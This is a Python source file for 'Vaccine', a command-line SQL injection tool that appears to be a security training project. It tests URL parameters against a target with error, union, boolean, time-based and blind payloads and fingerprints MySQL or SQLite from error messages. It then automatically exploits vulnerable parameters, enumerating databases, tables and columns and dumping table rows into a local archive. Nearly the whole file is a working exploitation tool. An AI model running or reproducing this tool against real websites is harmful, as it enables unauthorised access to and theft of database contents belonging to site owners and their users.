#!/usr/bin/env python3

import sys
import os
import json
import time
import requests
import argparse
import sqlite3
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Optional, Union
import re
import hashlib
from datetime import datetime

class VaccineInjection:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'VaccineInjection/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        self.results_cure = "vaccine_cure.db"
        self.init_database()
        
        self.payloads = {
            'error': [
                "'",
                "\"",
                "')",
                "\")",
                "'))",
                "\"))",
                "';",
                "\";",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR '1'='1' --",
                "\" OR \"1\"=\"1\" --",
                "' UNION SELECT NULL --",
                "\" UNION SELECT NULL --",
            ],
            'union': [
                "' UNION SELECT NULL --",
                "' UNION SELECT NULL, NULL --",
                "' UNION SELECT NULL, NULL, NULL --",
                "' UNION SELECT 1 --",
                "' UNION SELECT 1,2 --",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT version() --",
                "' UNION SELECT database() --",
                "' UNION SELECT user() --",
            ],
            'boolean': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR 'x'='x",
                "' OR 'x'='y",
                "' AND 1=1 --",
                "' AND 1=2 --",
                "' OR 1=1 --",
                "' OR 1=2 --",
                "') AND ('1'='1",
                "') AND ('1'='2",
            ],
            'time': [
                "' OR SLEEP(5) --",
                "' AND SLEEP(5) --",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            ],
            'blind': [
                "' AND IF(1=1,SLEEP(5),0) --",
                "' AND IF(1=2,SLEEP(5),0) --",
                "' OR IF(1=1,SLEEP(5),0) --",
                "' OR IF(1=2,SLEEP(5),0) --",
            ]
        }
        
        self.mysql_payloads = {
            'version': ["' UNION SELECT @@version, NULL --", "' UNION SELECT version(), NULL --"],
            'database': ["' UNION SELECT database(), NULL --"],
            'user': ["' UNION SELECT user(), NULL --"],
            'tables': ["' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --"],
            'columns': ["' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{table}' --"],
        }
        
        self.sqlite_payloads = {
            'version': ["' UNION SELECT sqlite_version(), NULL --"],
            'tables': ["' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --"],
            'columns': ["' UNION SELECT sql, NULL FROM sqlite_master WHERE name='{table}' --"],
        }
        
        # fingerprinting patterns
        self.db_patterns = {
            'mysql': [
                r"MySQL",
                r"You have an error in your SQL syntax",
                r"check the manual that corresponds to your MySQL",
                r"MariaDB server",
                r"MySQL server version",
                r"mysqli",
                r"mysql_fetch",
            ],
            'sqlite': [
                r"SQLite",
                r"SQLite3",
                r"unable to open database file",
                r"database disk image is malformed",
                r"SQLITE_ERROR",
                r"no such table",
                r"no such column",
            ]
        }

    def init_database(self):
        """Archive"""
        conn = sqlite3.connect(self.results_cure)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                method TEXT,
                timestamp DATETIME,
                vulnerable INTEGER,
                db_type TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                parameter TEXT,
                payload TEXT,
                type TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS databases (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                db_name TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tables (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                db_id INTEGER,
                table_name TEXT,
                FOREIGN KEY (db_id) REFERENCES databases (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS columns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                table_id INTEGER,
                column_name TEXT,
                data_type TEXT,
                FOREIGN KEY (table_id) REFERENCES tables (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS data_dumps (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                table_id INTEGER,
                row_data TEXT,
                FOREIGN KEY (table_id) REFERENCES tables (id)
            )
        ''')
        
        conn.commit()
        conn.close()

    def save_scan(self, url: str, method: str, vulnerable: bool, db_type: str = None) -> int:
        conn = sqlite3.connect(self.results_cure)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO scans (url, method, timestamp, vulnerable, db_type)
            VALUES (?, ?, ?, ?, ?)
        ''', (url, method, datetime.now(), 1 if vulnerable else 0, db_type))
        
        scan_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        return scan_id

    def save_vulnerability(self, scan_id: int, parameter: str, payload: str, vuln_type: str):
        conn = sqlite3.connect(self.results_cure)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO vulnerabilities (scan_id, parameter, payload, type)
            VALUES (?, ?, ?, ?)
        ''', (scan_id, parameter, payload, vuln_type))
        
        conn.commit()
        conn.close()

    def save_database_info(self, scan_id: int, db_name: str):
        conn = sqlite3.connect(self.results_cure)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO databases (scan_id, db_name)
            VALUES (?, ?)
        ''', (scan_id, db_name))
        
        db_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        return db_id

    def save_table_info(self, db_id: int, table_name: str):
        conn = sqlite3.connect(self.results_cure)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO tables (db_id, table_name)
            VALUES (?, ?)
        ''', (db_id, table_name))
        
        table_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        return table_id

    def save_column_info(self, table_id: int, column_name: str, data_type: str = None):
        conn = sqlite3.connect(self.results_cure)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO columns (table_id, column_name, data_type)
            VALUES (?, ?, ?)
        ''', (table_id, column_name, data_type))
        
        conn.commit()
        conn.close()

    def save_data_dump(self, table_id: int, row_data: str):
        conn = sqlite3.connect(self.results_cure)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO data_dumps (table_id, row_data)
            VALUES (?, ?)
        ''', (table_id, row_data))
        
        conn.commit()
        conn.close()

    def extract_parameters(self, url: str) -> Dict[str, str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        return {k: v[0] for k, v in params.items()}

    def test_injection(self, url: str, method: str = 'GET', params: Dict = None, 
                      data: Dict = None, param_to_test: str = None, 
                      payload: str = None) -> Tuple[bool, str]:
        try:
            original_value = None
            test_params = params.copy() if params else {}
            test_data = data.copy() if data else {}
            
            if param_to_test:
                if params and param_to_test in params:
                    original_value = params[param_to_test]
                    test_params[param_to_test] = payload
                elif data and param_to_test in data:
                    original_value = data[param_to_test]
                    test_data[param_to_test] = payload
            
            start_time = time.time()
            
            if method.upper() == 'GET':
                response = self.session.get(url, params=test_params, timeout=10)
            else:
                response = self.session.post(url, data=test_data, timeout=10)
            
            response_time = time.time() - start_time

            error_indicators = [
                'SQL syntax',
                'MySQL',
                'SQLite',
                'database',
                'syntax error',
                'unexpected end',
                'near "',
                'column',
                'table',
                'unknown column',
                'unknown table',
                'SQLSTATE',
                'Warning',
                'Fatal error'
            ]
            
            content = response.text.lower()
            for indicator in error_indicators:
                if indicator.lower() in content:
                    return True, f"Error-based: {indicator}"
            
            if 'sleep' in payload.lower() or 'benchmark' in payload.lower():
                if response_time > 5:
                    return True, f"Time-based: {response_time:.2f}s delay"
            
            if original_value:
                true_response = response.text
                
                false_payload = payload.replace("1=1", "1=2").replace("'1'='1'", "'1'='2'")
                if params and param_to_test in params:
                    test_params[param_to_test] = false_payload
                elif data and param_to_test in data:
                    test_data[param_to_test] = false_payload
                
                if method.upper() == 'GET':
                    false_response = self.session.get(url, params=test_params, timeout=10).text
                else:
                    false_response = self.session.post(url, data=test_data, timeout=10).text
                
                if true_response != false_response:
                    return True, "Boolean-based: Different responses"

            if 'union' in payload.lower() and 'union' in content:
                return True, "Union-based: UNION keyword found"
            
            return False, ""
            
        except Exception as e:
            return False, f"Error during test: {str(e)}"

    def fingerprint_database(self, response_text: str) -> str:
        """Identify database type from error messages"""
        response_lower = response_text.lower()
        
        for db_type, patterns in self.db_patterns.items():
            for pattern in patterns:
                if pattern.lower() in response_lower:
                    return db_type
        
        return "unknown"

    def detect_injections(self, url: str, method: str = 'GET', data: Dict = None) -> Dict:
        results = {
            'url': url,
            'method': method,
            'vulnerable': False,
            'vulnerable_params': [],
            'database_type': 'unknown',
            'payloads_used': [],
            'databases': [],
            'tables': {},
            'columns': {},
            'data_dump': {}
        }
        
        params = self.extract_parameters(url)
        
        for param_name in params.keys():
            print(f"\n[+] Testing parameter: {param_name}")
            
            test_methods = ['error', 'boolean', 'union', 'time', 'blind']
            for vuln_type in test_methods[:5]:
                if vuln_type in self.payloads:
                    for payload in self.payloads[vuln_type]:
                        print(f"  Testing {vuln_type} payload: {payload[:50]}...")
                        
                        vulnerable, reason = self.test_injection(
                            url.split('?')[0],
                            method,
                            params,
                            data,
                            param_name,
                            payload
                        )
                        
                        if vulnerable:
                            results['vulnerable'] = True
                            if param_name not in results['vulnerable_params']:
                                results['vulnerable_params'].append(param_name)
                            
                            results['payloads_used'].append({
                                'parameter': param_name,
                                'payload': payload,
                                'type': vuln_type,
                                'reason': reason
                            })
                            
                            # Try to fingerprint database
                            if reason.startswith("Error-based"):
                                test_response = self.session.get(
                                    url.split('?')[0], 
                                    params={**params, param_name: payload}
                                ).text if method == 'GET' else self.session.post(
                                    url.split('?')[0], 
                                    data={**data, param_name: payload}
                                ).text
                                
                                db_type = self.fingerprint_database(test_response)
                                if db_type != "unknown":
                                    results['database_type'] = db_type
                            
                            break
        
        return results

    def exploit_mysql(self, url: str, method: str, param: str) -> Dict:
        exploitation_results = {
            'databases': [],
            'tables': {},
            'columns': {},
            'data_dump': {}
        }
        
        base_url = url.split('?')[0]
        params = self.extract_parameters(url)
        
        print("\n[+] Extracting database names...")
        payload = f"' UNION SELECT database(), NULL --"
        params[param] = payload
        
        if method == 'GET':
            response = self.session.get(base_url, params=params)
        else:
            response = self.session.post(base_url, data=params)
        
        db_name = self.extract_single_value(response.text)
        if db_name:
            exploitation_results['databases'].append(db_name)
            print(f"  Found database: {db_name}")
            
            payload = f"' UNION SELECT schema_name, NULL FROM information_schema.schemata --"
            params[param] = payload
            
            if method == 'GET':
                response = self.session.get(base_url, params=params)
            else:
                response = self.session.post(base_url, data=params)
            
            databases = self.extract_from_response(response.text)
            exploitation_results['databases'] = databases
            
            if db_name in databases:
                print(f"\n[+] Extracting tables from database: {db_name}")
                
                payload = f"' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='{db_name}' --"
                params[param] = payload
                
                if method == 'GET':
                    response = self.session.get(base_url, params=params)
                else:
                    response = self.session.post(base_url, data=params)
                
                tables = self.extract_from_response(response.text)
                exploitation_results['tables'][db_name] = tables
                
                if tables:
                    for table_name in tables[:3]:
                        print(f"\n[+] Extracting columns from table: {table_name}")
                        
                        payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{table_name}' --"
                        params[param] = payload
                        
                        if method == 'GET':
                            response = self.session.get(base_url, params=params)
                        else:
                            response = self.session.post(base_url, data=params)
                        
                        columns = self.extract_from_response(response.text)
                        exploitation_results['columns'][table_name] = columns
                        
                        if columns:
                            print(f"[+] Dumping data from table: {table_name}")
                            col_list = ', '.join(columns)
                            payload = f"' UNION SELECT {col_list}, NULL FROM {db_name}.{table_name} LIMIT 10 --"
                            params[param] = payload
                            
                            if method == 'GET':
                                response = self.session.get(base_url, params=params)
                            else:
                                response = self.session.post(base_url, data=params)
                            
                            data = self.extract_tabular_data(response.text, len(columns))
                            exploitation_results['data_dump'][table_name] = data
        
        return exploitation_results

    def exploit_sqlite(self, url: str, method: str, param: str) -> Dict:
        exploitation_results = {
            'databases': ['main'],
            'tables': {},
            'columns': {},
            'data_dump': {}
        }
        
        base_url = url.split('?')[0]
        params = self.extract_parameters(url)
        
        print("\n[+] Extracting table names from SQLite...")
        payload = f"' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --"
        params[param] = payload
        
        if method == 'GET':
            response = self.session.get(base_url, params=params)
        else:
            response = self.session.post(base_url, data=params)
        
        tables = self.extract_from_response(response.text)
        exploitation_results['tables']['main'] = tables
        
        if tables:
            for table_name in tables[:3]:
                print(f"\n[+] Extracting columns from table: {table_name}")
                
                payload = f"' UNION SELECT sql, NULL FROM sqlite_master WHERE name='{table_name}' --"
                params[param] = payload
                
                if method == 'GET':
                    response = self.session.get(base_url, params=params)
                else:
                    response = self.session.post(base_url, data=params)
                
                create_stmt = self.extract_single_value(response.text)
                if create_stmt:
                    columns = self.parse_sqlite_columns(create_stmt)
                    exploitation_results['columns'][table_name] = columns
                    
                    if columns:
                        print(f"[+] Dumping data from table: {table_name}")
                        col_list = ', '.join(columns)
                        payload = f"' UNION SELECT {col_list}, NULL FROM {table_name} LIMIT 10 --"
                        params[param] = payload
                        
                        if method == 'GET':
                            response = self.session.get(base_url, params=params)
                        else:
                            response = self.session.post(base_url, data=params)
                        
                        data = self.extract_tabular_data(response.text, len(columns))
                        exploitation_results['data_dump'][table_name] = data
        
        return exploitation_results

    def extract_single_value(self, content: str) -> str:
        """Extract a single value from response"""
        lines = content.split('\n')
        for line in lines:
            clean_line = line.strip()
            if (len(clean_line) < 100 and len(clean_line) > 1 and
                clean_line.lower() not in ['null', 'none', ''] and
                not re.search(r'[<>{}()\[\]]', clean_line)):
                return clean_line
        return ""

    def extract_from_response(self, content: str) -> List[str]:
        """Extract multiple values from response"""
        lines = content.split('\n')
        extracted = []
        
        for line in lines:
            clean_line = line.strip()
            if (len(clean_line) < 100 and len(clean_line) > 1 and
                clean_line.lower() not in ['null', 'none', ''] and
                not re.search(r'[<>{}()\[\]]', clean_line) and
                re.match(r'^[a-zA-Z0-9_]+$', clean_line)):
                extracted.append(clean_line)
        
        return list(set(extracted))[:20]

    def extract_tabular_data(self, content: str, num_columns: int) -> List[List[str]]:
        """Extract tabular data from response"""
        data = []
        lines = content.split('\n')
        
        for line in lines:
            if '|' in line:
                row = [cell.strip() for cell in line.split('|') if cell.strip()]
                if len(row) == num_columns:
                    data.append(row)
            elif '<td>' in line.lower():
                cells = re.findall(r'<td[^>]*>(.*?)</td>', line, re.IGNORECASE)
                if len(cells) == num_columns:
                    data.append([cell.strip() for cell in cells])
        
        return data[:10]

    def parse_sqlite_columns(self, create_stmt: str) -> List[str]:
        """Parse SQLite CREATE TABLE statement"""
        columns = []
        if not create_stmt:
            return columns
        
        pattern = r'CREATE\s+TABLE\s+\w+\s*\((.*?)\)'
        match = re.search(pattern, create_stmt, re.IGNORECASE | re.DOTALL)
        
        if match:
            column_defs = match.group(1)
            defs = re.split(r',\s*(?![^()]*\))', column_defs)
            
            for col_def in defs:
                col_def = col_def.strip()
                if col_def and not col_def.upper().startswith('PRIMARY KEY') and \
                   not col_def.upper().startswith('FOREIGN KEY') and \
                   not col_def.upper().startswith('UNIQUE') and \
                   not col_def.upper().startswith('CHECK'):
                    col_name = col_def.split()[0].strip('"\'`[]')
                    columns.append(col_name)
        
        return columns

    def generate_report(self, results: Dict, output_file: str = None):
        """Generate JSON report"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"vaccine_report_{timestamp}.json"
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\n[+] Report saved to: {output_file}")
        return output_file

def main():
    parser = argparse.ArgumentParser(
        description='Vaccine',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''Examples:
  ./vaccine "http://example.com/page.php?id=1"
  ./vaccine -X POST "http://example.com/login.php"
  ./vaccine -o report.json "http://example.com/page.php?id=1"
        '''
    )
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-X', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method (default: GET)')
    
    args = parser.parse_args()
    
    print(f"""
Vaccine                
    
Target: {args.url}
Method: {args.method}
Output: {args.output if args.output else 'Default'}
    """)
    
    scanner = VaccineInjection()
    
    print("\n Injection testing")
    results = scanner.detect_injections(args.url, args.method)
    
    if results['vulnerable']:
        print("\n - Vulnerable parameters:")
        print(f"    Parameters: {', '.join(results['vulnerable_params'])}")
        print(f"    Database Type: {results['database_type']}")
        print(f"    Payloads Used: {len(results['payloads_used'])}")
        
        scan_id = scanner.save_scan(
            args.url, 
            args.method, 
            True, 
            results['database_type']
        )
        
        for vuln in results['payloads_used']:
            scanner.save_vulnerability(
                scan_id,
                vuln['parameter'],
                vuln['payload'],
                vuln['type']
            )
        
        if results['database_type'] in ['mysql', 'sqlite'] and results['vulnerable_params']:
            print("\n - Exploiting vulnerabilities:")
            param = results['vulnerable_params'][0]
            
            if results['database_type'] == 'mysql':
                exploitation_results = scanner.exploit_mysql(args.url, args.method, param)
            else:
                exploitation_results = scanner.exploit_sqlite(args.url, args.method, param)
            
            results.update(exploitation_results)
            
            for db_name in results.get('databases', []):
                db_id = scanner.save_database_info(scan_id, db_name)
                
                if db_name in results.get('tables', {}):
                    for table_name in results['tables'][db_name]:
                        table_id = scanner.save_table_info(db_id, table_name)
                        
                        if table_name in results.get('columns', {}):
                            for column_name in results['columns'][table_name]:
                                scanner.save_column_info(table_id, column_name)
                        
                        if table_name in results.get('data_dump', {}):
                            for row in results['data_dump'][table_name]:
                                scanner.save_data_dump(table_id, str(row))
            
            print("\n - Results:")
            print(f"    Databases found: {len(results.get('databases', []))}")
            for db in results.get('databases', []):
                print(f"      - {db}")
            
            if 'tables' in results:
                for db, tables in results['tables'].items():
                    print(f"\n    Tables in {db}: {len(tables)}")
                    for table in tables[:5]:
                        print(f"      - {table}")
            
            if 'data_dump' in results:
                for table, data in results['data_dump'].items():
                    if data:
                        print(f"\n    Data from {table} ({len(data)} rows):")
                        for i, row in enumerate(data[:3], 1):
                            print(f"      Row {i}: {row}")
    else:
        print("\nNo vulnerabilities")
        scanner.save_scan(args.url, args.method, False)
    
    report_file = scanner.generate_report(results, args.output)
    print(f"    Report: {report_file}")
    print(f"    Database: {scanner.results_cure}")

if __name__ == "__main__":
    main()
